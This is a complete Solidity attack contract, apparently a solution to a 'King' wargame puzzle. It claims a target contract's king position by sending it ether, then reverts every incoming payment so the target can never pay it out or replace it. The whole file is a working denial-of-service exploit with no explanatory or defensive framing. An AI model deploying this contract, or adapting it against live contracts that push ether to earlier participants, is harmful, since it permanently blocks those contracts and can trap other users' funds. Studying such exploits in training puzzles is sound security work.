// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttacker {
  address payable kingContract;

  constructor(address payable _kingContract) {
    kingContract = _kingContract;
  }

  function attack() external payable {
    (bool sent, ) = kingContract.call{value: msg.value}('');
    require(sent, 'Failed attack');
  }

  receive() external payable {
    revert();
  }
}
